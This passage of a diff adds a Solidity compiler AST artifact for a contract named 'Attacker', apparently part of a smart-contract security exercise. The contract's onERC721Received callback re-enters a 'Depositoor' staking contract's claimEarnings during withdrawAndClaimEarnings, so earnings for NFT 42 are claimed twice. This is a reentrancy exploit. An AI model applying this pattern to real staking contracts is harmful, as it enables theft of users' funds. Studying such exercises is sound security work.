+              },
+              "referencedDeclaration": 32517,
+              "src": "188:10:31",
+              "typeDescriptions": {
+                "typeIdentifier": "t_contract$_NftToStake_$32517",
+                "typeString": "contract NftToStake"
+              }
+            },
+            "visibility": "public"
+          },
+          {
+            "id": 32397,
+            "nodeType": "VariableDeclaration",
+            "src": "215:28:31",
+            "nodes": [],
+            "constant": false,
+            "functionSelector": "3bffcb63",
+            "mutability": "mutable",
+            "name": "depositoor",
+            "nameLocation": "233:10:31",
+            "scope": 32469,
+            "stateVariable": true,
+            "storageLocation": "default",
+            "typeDescriptions": {
+              "typeIdentifier": "t_contract$_Depositoor_$32776",
+              "typeString": "contract Depositoor"
+            },
+            "typeName": {
+              "id": 32396,
+              "nodeType": "UserDefinedTypeName",
+              "pathNode": {
+                "id": 32395,
+                "name": "Depositoor",
+                "nodeType": "IdentifierPath",
+                "referencedDeclaration": 32776,
+                "src": "215:10:31"
+              },
+              "referencedDeclaration": 32776,
+              "src": "215:10:31",
+              "typeDescriptions": {
+                "typeIdentifier": "t_contract$_Depositoor_$32776",
+                "typeString": "contract Depositoor"
+              }
+            },
+            "visibility": "public"
+          },
+          {
+            "id": 32415,
+            "nodeType": "FunctionDefinition",
+            "src": "250:133:31",
+            "nodes": [],
+            "body": {
+              "id": 32414,
+              "nodeType": "Block",
+              "src": "322:61:31",
+              "nodes": [],
+              "statements": [
+                {
+                  "expression": {
+                    "id": 32408,
+                    "isConstant": false,
+                    "isLValue": false,
+                    "isPure": false,
+                    "lValueRequested": false,
+                    "leftHandSide": {
+                      "id": 32406,
+                      "name": "nft",
+                      "nodeType": "Identifier",
+                      "overloadedDeclarations": [],
+                      "referencedDeclaration": 32394,
+                      "src": "332:3:31",
+                      "typeDescriptions": {
+                        "typeIdentifier": "t_contract$_NftToStake_$32517",
+                        "typeString": "contract NftToStake"
+                      }
+                    },
+                    "nodeType": "Assignment",
+                    "operator": "=",
+                    "rightHandSide": {
+                      "id": 32407,
+                      "name": "_nft",
+                      "nodeType": "Identifier",
+                      "overloadedDeclarations": [],
+                      "referencedDeclaration": 32400,
+                      "src": "338:4:31",
+                      "typeDescriptions": {
+                        "typeIdentifier": "t_contract$_NftToStake_$32517",
+                        "typeString": "contract NftToStake"
+                      }
+                    },
+                    "src": "332:10:31",
+                    "typeDescriptions": {
+                      "typeIdentifier": "t_contract$_NftToStake_$32517",
+                      "typeString": "contract NftToStake"
+                    }
+                  },
+                  "id": 32409,
+                  "nodeType": "ExpressionStatement",
+                  "src": "332:10:31"
+                },
+                {
+                  "expression": {
+                    "id": 32412,
+                    "isConstant": false,
+                    "isLValue": false,
+                    "isPure": false,
+                    "lValueRequested": false,
+                    "leftHandSide": {
+                      "id": 32410,
+                      "name": "depositoor",
+                      "nodeType": "Identifier",
+                      "overloadedDeclarations": [],
+                      "referencedDeclaration": 32397,
+                      "src": "352:10:31",
+                      "typeDescriptions": {
+                        "typeIdentifier": "t_contract$_Depositoor_$32776",
+                        "typeString": "contract Depositoor"
+                      }
+                    },
+                    "nodeType": "Assignment",
+                    "operator": "=",
+                    "rightHandSide": {
+                      "id": 32411,
+                      "name": "_depositoor",
+                      "nodeType": "Identifier",
+                      "overloadedDeclarations": [],
+                      "referencedDeclaration": 32403,
+                      "src": "365:11:31",
+                      "typeDescriptions": {
+                        "typeIdentifier": "t_contract$_Depositoor_$32776",
+                        "typeString": "contract Depositoor"
+                      }
+                    },
+                    "src": "352:24:31",
+                    "typeDescriptions": {
+                      "typeIdentifier": "t_contract$_Depositoor_$32776",
+                      "typeString": "contract Depositoor"
+                    }
+                  },
+                  "id": 32413,
+                  "nodeType": "ExpressionStatement",
+                  "src": "352:24:31"
+                }
+              ]
+            },
+            "functionSelector": "d8952a49",
+            "implemented": true,
+            "kind": "function",
+            "modifiers": [],
+            "name": "setContracts",
+            "nameLocation": "259:12:31",
+            "parameters": {
+              "id": 32404,
+              "nodeType": "ParameterList",
+              "parameters": [
+                {
+                  "constant": false,
+                  "id": 32400,
+                  "mutability": "mutable",
+                  "name": "_nft",
+                  "nameLocation": "283:4:31",
+                  "nodeType": "VariableDeclaration",
+                  "scope": 32415,
+                  "src": "272:15:31",
+                  "stateVariable": false,
+                  "storageLocation": "default",
+                  "typeDescriptions": {
+                    "typeIdentifier": "t_contract$_NftToStake_$32517",
+                    "typeString": "contract NftToStake"
+                  },
+                  "typeName": {
+                    "id": 32399,
+                    "nodeType": "UserDefinedTypeName",
+                    "pathNode": {
+                      "id": 32398,
+                      "name": "NftToStake",
+                      "nodeType": "IdentifierPath",
+                      "referencedDeclaration": 32517,
+                      "src": "272:10:31"
+                    },
+                    "referencedDeclaration": 32517,
+                    "src": "272:10:31",
+                    "typeDescriptions": {
+                      "typeIdentifier": "t_contract$_NftToStake_$32517",
+                      "typeString": "contract NftToStake"
+                    }
+                  },
+                  "visibility": "internal"
+                },
+                {
+                  "constant": false,
+                  "id": 32403,
+                  "mutability": "mutable",
+                  "name": "_depositoor",
+                  "nameLocation": "300:11:31",
+                  "nodeType": "VariableDeclaration",
+                  "scope": 32415,
+                  "src": "289:22:31",
+                  "stateVariable": false,
+                  "storageLocation": "default",
+                  "typeDescriptions": {
+                    "typeIdentifier": "t_contract$_Depositoor_$32776",
+                    "typeString": "contract Depositoor"
+                  },
+                  "typeName": {
+                    "id": 32402,
+                    "nodeType": "UserDefinedTypeName",
+                    "pathNode": {
+                      "id": 32401,
+                      "name": "Depositoor",
+                      "nodeType": "IdentifierPath",
+                      "referencedDeclaration": 32776,
+                      "src": "289:10:31"
+                    },
+                    "referencedDeclaration": 32776,
+                    "src": "289:10:31",
+                    "typeDescriptions": {
+                      "typeIdentifier": "t_contract$_Depositoor_$32776",
+                      "typeString": "contract Depositoor"
+                    }
+                  },
+                  "visibility": "internal"
+                }
+              ],
+              "src": "271:41:31"
+            },
+            "returnParameters": {
+              "id": 32405,
+              "nodeType": "ParameterList",
+              "parameters": [],
+              "src": "322:0:31"
+            },
+            "scope": 32469,
+            "stateMutability": "nonpayable",
+            "virtual": false,
+            "visibility": "external"
+          },
+          {
+            "id": 32434,
+            "nodeType": "FunctionDefinition",
+            "src": "389:115:31",
+            "nodes": [],
+            "body": {
+              "id": 32433,
+              "nodeType": "Block",
+              "src": "418:86:31",
+              "nodes": [],
+              "statements": [
+                {
+                  "expression": {
+                    "arguments": [
+                      {
+                        "arguments": [
+                          {
+                            "id": 32424,
+                            "name": "this",
+                            "nodeType": "Identifier",
+                            "overloadedDeclarations": [],
+                            "referencedDeclaration": -28,
+                            "src": "466:4:31",
+                            "typeDescriptions": {
+                              "typeIdentifier": "t_contract$_Attacker_$32469",
+                              "typeString": "contract Attacker"
+                            }
+                          }
+                        ],
+                        "expression": {
+                          "argumentTypes": [
+                            {
+                              "typeIdentifier": "t_contract$_Attacker_$32469",
+                              "typeString": "contract Attacker"
+                            }
+                          ],
+                          "id": 32423,
+                          "isConstant": false,
+                          "isLValue": false,
+                          "isPure": true,
+                          "lValueRequested": false,
+                          "nodeType": "ElementaryTypeNameExpression",
+                          "src": "458:7:31",
+                          "typeDescriptions": {
+                            "typeIdentifier": "t_type$_t_address_$",
+                            "typeString": "type(address)"
+                          },
+                          "typeName": {
+                            "id": 32422,
+                            "name": "address",
+                            "nodeType": "ElementaryTypeName",
+                            "src": "458:7:31",
+                            "typeDescriptions": {}
+                          }
+                        },
+                        "id": 32425,
+                        "isConstant": false,
+                        "isLValue": false,
+                        "isPure": false,
+                        "kind": "typeConversion",
+                        "lValueRequested": false,
+                        "names": [],
+                        "nodeType": "FunctionCall",
+                        "src": "458:13:31",
+                        "tryCall": false,
+                        "typeDescriptions": {
+                          "typeIdentifier": "t_address",
+                          "typeString": "address"
+                        }
+                      },
+                      {
+                        "arguments": [
+                          {
+                            "id": 32428,
+                            "name": "depositoor",
+                            "nodeType": "Identifier",
+                            "overloadedDeclarations": [],
+                            "referencedDeclaration": 32397,
+                            "src": "481:10:31",
+                            "typeDescriptions": {
+                              "typeIdentifier": "t_contract$_Depositoor_$32776",
+                              "typeString": "contract Depositoor"
+                            }
+                          }
+                        ],
+                        "expression": {
+                          "argumentTypes": [
+                            {
+                              "typeIdentifier": "t_contract$_Depositoor_$32776",
+                              "typeString": "contract Depositoor"
+                            }
+                          ],
+                          "id": 32427,
+                          "isConstant": false,
+                          "isLValue": false,
+                          "isPure": true,
+                          "lValueRequested": false,
+                          "nodeType": "ElementaryTypeNameExpression",
+                          "src": "473:7:31",
+                          "typeDescriptions": {
+                            "typeIdentifier": "t_type$_t_address_$",
+                            "typeString": "type(address)"
+                          },
+                          "typeName": {
+                            "id": 32426,
+                            "name": "address",
+                            "nodeType": "ElementaryTypeName",
+                            "src": "473:7:31",
+                            "typeDescriptions": {}
+                          }
+                        },
+                        "id": 32429,
+                        "isConstant": false,
+                        "isLValue": false,
+                        "isPure": false,
+                        "kind": "typeConversion",
+                        "lValueRequested": false,
+                        "names": [],
+                        "nodeType": "FunctionCall",
+                        "src": "473:19:31",
+                        "tryCall": false,
+                        "typeDescriptions": {
+                          "typeIdentifier": "t_address",
+                          "typeString": "address"
+                        }
+                      },
+                      {
+                        "hexValue": "3432",
+                        "id": 32430,
+                        "isConstant": false,
+                        "isLValue": false,
+                        "isPure": true,
+                        "kind": "number",
+                        "lValueRequested": false,
+                        "nodeType": "Literal",
+                        "src": "494:2:31",
+                        "typeDescriptions": {
+                          "typeIdentifier": "t_rational_42_by_1",
+                          "typeString": "int_const 42"
+                        },
+                        "value": "42"
+                      }
+                    ],
+                    "expression": {
+                      "argumentTypes": [
+                        {
+                          "typeIdentifier": "t_address",
+                          "typeString": "address"
+                        },
+                        {
+                          "typeIdentifier": "t_address",
+                          "typeString": "address"
+                        },
+                        {
+                          "typeIdentifier": "t_rational_42_by_1",
+                          "typeString": "int_const 42"
+                        }
+                      ],
+                      "expression": {
+                        "arguments": [
+                          {
+                            "id": 32419,
+                            "name": "nft",
+                            "nodeType": "Identifier",
+                            "overloadedDeclarations": [],
+                            "referencedDeclaration": 32394,
+                            "src": "436:3:31",
+                            "typeDescriptions": {
+                              "typeIdentifier": "t_contract$_NftToStake_$32517",
+                              "typeString": "contract NftToStake"
+                            }
+                          }
+                        ],
+                        "expression": {
+                          "argumentTypes": [
+                            {
+                              "typeIdentifier": "t_contract$_NftToStake_$32517",
+                              "typeString": "contract NftToStake"
+                            }
+                          ],
+                          "id": 32418,
+                          "name": "IERC721",
+                          "nodeType": "Identifier",
+                          "overloadedDeclarations": [],
+                          "referencedDeclaration": 30914,
+                          "src": "428:7:31",
+                          "typeDescriptions": {
+                            "typeIdentifier": "t_type$_t_contract$_IERC721_$30914_$",
+                            "typeString": "type(contract IERC721)"
+                          }
+                        },
+                        "id": 32420,
+                        "isConstant": false,
+                        "isLValue": false,
+                        "isPure": false,
+                        "kind": "typeConversion",
+                        "lValueRequested": false,
+                        "names": [],
+                        "nodeType": "FunctionCall",
+                        "src": "428:12:31",
+                        "tryCall": false,
+                        "typeDescriptions": {
+                          "typeIdentifier": "t_contract$_IERC721_$30914",
+                          "typeString": "contract IERC721"
+                        }
+                      },
+                      "id": 32421,
+                      "isConstant": false,
+                      "isLValue": false,
+                      "isPure": false,
+                      "lValueRequested": false,
+                      "memberName": "safeTransferFrom",
+                      "nodeType": "MemberAccess",
+                      "referencedDeclaration": 30869,
+                      "src": "428:29:31",
+                      "typeDescriptions": {
+                        "typeIdentifier": "t_function_external_nonpayable$_t_address_$_t_address_$_t_uint256_$returns$__$",
+                        "typeString": "function (address,address,uint256) external"
+                      }
+                    },
+                    "id": 32431,
+                    "isConstant": false,
+                    "isLValue": false,
+                    "isPure": false,
+                    "kind": "functionCall",
+                    "lValueRequested": false,
+                    "names": [],
+                    "nodeType": "FunctionCall",
+                    "src": "428:69:31",
+                    "tryCall": false,
+                    "typeDescriptions": {
+                      "typeIdentifier": "t_tuple$__$",
+                      "typeString": "tuple()"
+                    }
+                  },
+                  "id": 32432,
+                  "nodeType": "ExpressionStatement",
+                  "src": "428:69:31"
+                }
+              ]
+            },
+            "functionSelector": "8a4068dd",
+            "implemented": true,
+            "kind": "function",
+            "modifiers": [],
+            "name": "transfer",
+            "nameLocation": "398:8:31",
+            "parameters": {
+              "id": 32416,
+              "nodeType": "ParameterList",
+              "parameters": [],
+              "src": "406:2:31"
+            },
+            "returnParameters": {
+              "id": 32417,
+              "nodeType": "ParameterList",
+              "parameters": [],
+              "src": "418:0:31"
+            },
+            "scope": 32469,
+            "stateMutability": "nonpayable",
+            "virtual": false,
+            "visibility": "external"
+          },
+          {
+            "id": 32444,
+            "nodeType": "FunctionDefinition",
+            "src": "510:83:31",
+            "nodes": [],
+            "body": {
+              "id": 32443,
+              "nodeType": "Block",
+              "src": "537:56:31",
+              "nodes": [],
+              "statements": [
+                {
+                  "expression": {
+                    "arguments": [
+                      {
+                        "hexValue": "3432",
+                        "id": 32440,
+                        "isConstant": false,
+                        "isLValue": false,
+                        "isPure": true,
+                        "kind": "number",
+                        "lValueRequested": false,
+                        "nodeType": "Literal",
+                        "src": "583:2:31",
+                        "typeDescriptions": {
+                          "typeIdentifier": "t_rational_42_by_1",
+                          "typeString": "int_const 42"
+                        },
+                        "value": "42"
+                      }
+                    ],
+                    "expression": {
+                      "argumentTypes": [
+                        {
+                          "typeIdentifier": "t_rational_42_by_1",
+                          "typeString": "int_const 42"
+                        }
+                      ],
+                      "expression": {
+                        "id": 32437,
+                        "name": "depositoor",
+                        "nodeType": "Identifier",
+                        "overloadedDeclarations": [],
+                        "referencedDeclaration": 32397,
+                        "src": "547:10:31",
+                        "typeDescriptions": {
+                          "typeIdentifier": "t_contract$_Depositoor_$32776",
+                          "typeString": "contract Depositoor"
+                        }
+                      },
+                      "id": 32439,
+                      "isConstant": false,
+                      "isLValue": false,
+                      "isPure": false,
+                      "lValueRequested": false,
+                      "memberName": "withdrawAndClaimEarnings",
+                      "nodeType": "MemberAccess",
+                      "referencedDeclaration": 32719,
+                      "src": "547:35:31",
+                      "typeDescriptions": {
+                        "typeIdentifier": "t_function_external_nonpayable$_t_uint256_$returns$__$",
+                        "typeString": "function (uint256) external"
+                      }
+                    },
+                    "id": 32441,
+                    "isConstant": false,
+                    "isLValue": false,
+                    "isPure": false,
+                    "kind": "functionCall",
+                    "lValueRequested": false,
+                    "names": [],
+                    "nodeType": "FunctionCall",
+                    "src": "547:39:31",
+                    "tryCall": false,
+                    "typeDescriptions": {
+                      "typeIdentifier": "t_tuple$__$",
+                      "typeString": "tuple()"
+                    }
+                  },
+                  "id": 32442,
+                  "nodeType": "ExpressionStatement",
+                  "src": "547:39:31"
+                }
+              ]
+            },
+            "functionSelector": "9e5faafc",
+            "implemented": true,
+            "kind": "function",
+            "modifiers": [],
+            "name": "attack",
+            "nameLocation": "519:6:31",
+            "parameters": {
+              "id": 32435,
+              "nodeType": "ParameterList",
+              "parameters": [],
+              "src": "525:2:31"
+            },
+            "returnParameters": {
+              "id": 32436,
+              "nodeType": "ParameterList",
+              "parameters": [],
+              "src": "537:0:31"
+            },
+            "scope": 32469,
+            "stateMutability": "nonpayable",
+            "virtual": false,
+            "visibility": "external"
+          },
+          {
+            "id": 32468,
+            "nodeType": "FunctionDefinition",
+            "src": "599:237:31",
+            "nodes": [],
+            "body": {
+              "id": 32467,
+              "nodeType": "Block",
+              "src": "732:104:31",
+              "nodes": [],
+              "statements": [
+                {
+                  "expression": {
+                    "arguments": [
+                      {
+                        "hexValue": "3432",
+                        "id": 32460,
+                        "isConstant": false,
+                        "isLValue": false,
+                        "isPure": true,
+                        "kind": "number",
+                        "lValueRequested": false,
+                        "nodeType": "Literal",
+                        "src": "767:2:31",
+                        "typeDescriptions": {
+                          "typeIdentifier": "t_rational_42_by_1",
+                          "typeString": "int_const 42"
+                        },
+                        "value": "42"
+                      }
+                    ],
+                    "expression": {
+                      "argumentTypes": [
+                        {
+                          "typeIdentifier": "t_rational_42_by_1",
+                          "typeString": "int_const 42"
+                        }
+                      ],
+                      "expression": {
+                        "id": 32457,
+                        "name": "depositoor",
+                        "nodeType": "Identifier",
+                        "overloadedDeclarations": [],
+                        "referencedDeclaration": 32397,
+                        "src": "742:10:31",
+                        "typeDescriptions": {
+                          "typeIdentifier": "t_contract$_Depositoor_$32776",
+                          "typeString": "contract Depositoor"
+                        }
+                      },
+                      "id": 32459,
+                      "isConstant": false,
+                      "isLValue": false,
+                      "isPure": false,
+                      "lValueRequested": false,
+                      "memberName": "claimEarnings",
+                      "nodeType": "MemberAccess",
+                      "referencedDeclaration": 32675,
+                      "src": "742:24:31",
+                      "typeDescriptions": {
+                        "typeIdentifier": "t_function_external_nonpayable$_t_uint256_$returns$__$",
+                        "typeString": "function (uint256) external"
+                      }
+                    },
+                    "id": 32461,
+                    "isConstant": false,
+                    "isLValue": false,
+                    "isPure": false,
+                    "kind": "functionCall",
+                    "lValueRequested": false,
+                    "names": [],
+                    "nodeType": "FunctionCall",
+                    "src": "742:28:31",
+                    "tryCall": false,
+                    "typeDescriptions": {
+                      "typeIdentifier": "t_tuple$__$",
+                      "typeString": "tuple()"
+                    }
+                  },
+                  "id": 32462,
+                  "nodeType": "ExpressionStatement",
+                  "src": "742:28:31"
+                },
+                {
+                  "expression": {
+                    "expression": {
+                      "expression": {
+                        "id": 32463,
+                        "name": "IERC721Receiver",
+                        "nodeType": "Identifier",
+                        "overloadedDeclarations": [],
+                        "referencedDeclaration": 30932,
+                        "src": "788:15:31",
+                        "typeDescriptions": {
+                          "typeIdentifier": "t_type$_t_contract$_IERC721Receiver_$30932_$",
+                          "typeString": "type(contract IERC721Receiver)"
+                        }
+                      },
+                      "id": 32464,
+                      "isConstant": false,
+                      "isLValue": false,
+                      "isPure": true,
+                      "lValueRequested": false,
+                      "memberName": "onERC721Received",
+                      "nodeType": "MemberAccess",
+                      "referencedDeclaration": 30931,
+                      "src": "788:32:31",
+                      "typeDescriptions": {
+                        "typeIdentifier": "t_function_declaration_nonpayable$_t_address_$_t_address_$_t_uint256_$_t_bytes_calldata_ptr_$returns$_t_bytes4_$",
+                        "typeString": "function IERC721Receiver.onERC721Received(address,address,uint256,bytes calldata) returns (bytes4)"
+                      }
+                    },
+                    "id": 32465,
+                    "isConstant": false,
+                    "isLValue": false,
+                    "isPure": true,
+                    "lValueRequested": false,
+                    "memberName": "selector",
+                    "nodeType": "MemberAccess",
+                    "src": "788:41:31",
+                    "typeDescriptions": {
+                      "typeIdentifier": "t_bytes4",
+                      "typeString": "bytes4"
+                    }
+                  },
+                  "functionReturnParameters": 32456,
+                  "id": 32466,
+                  "nodeType": "Return",
+                  "src": "781:48:31"
+                }
+              ]
+            },
+            "functionSelector": "150b7a02",
+            "implemented": true,
+            "kind": "function",
+            "modifiers": [],
+            "name": "onERC721Received",
+            "nameLocation": "608:16:31",
+            "parameters": {
+              "id": 32453,
+              "nodeType": "ParameterList",
+              "parameters": [
+                {
+                  "constant": false,
+                  "id": 32446,
+                  "mutability": "mutable",
+                  "name": "",
+                  "nameLocation": "-1:-1:-1",
+                  "nodeType": "VariableDeclaration",
+                  "scope": 32468,
+                  "src": "634:7:31",
+                  "stateVariable": false,
+                  "storageLocation": "default",
+                  "typeDescriptions": {
+                    "typeIdentifier": "t_address",
+                    "typeString": "address"
+                  },
+                  "typeName": {
+                    "id": 32445,
+                    "name": "address",
+                    "nodeType": "ElementaryTypeName",
+                    "src": "634:7:31",
+                    "stateMutability": "nonpayable",
+                    "typeDescriptions": {
+                      "typeIdentifier": "t_address",
+                      "typeString": "address"
+                    }
+                  },
+                  "visibility": "internal"
+                },
+                {
+                  "constant": false,
+                  "id": 32448,
+                  "mutability": "mutable",
+                  "name": "",
+                  "nameLocation": "-1:-1:-1",
+                  "nodeType": "VariableDeclaration",
+                  "scope": 32468,
+                  "src": "651:7:31",
+                  "stateVariable": false,
+                  "storageLocation": "default",
+                  "typeDescriptions": {
+                    "typeIdentifier": "t_address",
+                    "typeString": "address"
+                  },
+                  "typeName": {
+                    "id": 32447,
+                    "name": "address",
+                    "nodeType": "ElementaryTypeName",
+                    "src": "651:7:31",
+                    "stateMutability": "nonpayable",
+                    "typeDescriptions": {
+                      "typeIdentifier": "t_address",
+                      "typeString": "address"
+                    }
+                  },
+                  "visibility": "internal"
+                },
+                {
+                  "constant": false,
+                  "id": 32450,
+                  "mutability": "mutable",
+                  "name": "",
+                  "nameLocation": "-1:-1:-1",
+                  "nodeType": "VariableDeclaration",
+                  "scope": 32468,
+                  "src": "668:7:31",
+                  "stateVariable": false,
+                  "storageLocation": "default",
+                  "typeDescriptions": {
+                    "typeIdentifier": "t_uint256",
+                    "typeString": "uint256"
+                  },
+                  "typeName": {
+                    "id": 32449,
+                    "name": "uint256",
+                    "nodeType": "ElementaryTypeName",
+                    "src": "668:7:31",
+                    "typeDescriptions": {
+                      "typeIdentifier": "t_uint256",
+                      "typeString": "uint256"
+                    }
+                  },
+                  "visibility": "internal"
+                },
+                {
+                  "constant": false,
+                  "id": 32452,
+                  "mutability": "mutable",
+                  "name": "",
+                  "nameLocation": "-1:-1:-1",
+                  "nodeType": "VariableDeclaration",
+                  "scope": 32468,
+                  "src": "685:14:31",
+                  "stateVariable": false,
+                  "storageLocation": "calldata",
+                  "typeDescriptions": {
+                    "typeIdentifier": "t_bytes_calldata_ptr",
+                    "typeString": "bytes"
+                  },
+                  "typeName": {
+                    "id": 32451,
+                    "name": "bytes",
+                    "nodeType": "ElementaryTypeName",
+                    "src": "685:5:31",
+                    "typeDescriptions": {
+                      "typeIdentifier": "t_bytes_storage_ptr",
+                      "typeString": "bytes"
+                    }
+                  },
+                  "visibility": "internal"
+                }
+              ],
+              "src": "624:81:31"
+            },
+            "returnParameters": {
+              "id": 32456,
+              "nodeType": "ParameterList",
+              "parameters": [
+                {
+                  "constant": false,
+                  "id": 32455,
+                  "mutability": "mutable",
+                  "name": "",
+                  "nameLocation": "-1:-1:-1",
+                  "nodeType": "VariableDeclaration",
+                  "scope": 32468,
+                  "src": "724:6:31",
+                  "stateVariable": false,
+                  "storageLocation": "default",
+                  "typeDescriptions": {
+                    "typeIdentifier": "t_bytes4",
+                    "typeString": "bytes4"
+                  },
+                  "typeName": {
+                    "id": 32454,
+                    "name": "bytes4",
+                    "nodeType": "ElementaryTypeName",
+                    "src": "724:6:31",
+                    "typeDescriptions": {
+                      "typeIdentifier": "t_bytes4",
+                      "typeString": "bytes4"
+                    }
+                  },
+                  "visibility": "internal"
+                }
+              ],
+              "src": "723:8:31"
+            },
+            "scope": 32469,
+            "stateMutability": "nonpayable",
+            "virtual": false,
+            "visibility": "external"
+          }
+        ],
+        "abstract": false,
+        "baseContracts": [],
+        "canonicalName": "Attacker",
+        "contractDependencies": [],
+        "contractKind": "contract",
+        "fullyImplemented": true,
+        "linearizedBaseContracts": [
+          32469
+        ],
+        "name": "Attacker",
+        "nameLocation": "173:8:31",
+        "scope": 32470,
+        "usedErrors": []
+      }
+    ],
+    "license": "GPL-3.0"
+  },
+  "id": 31
+}
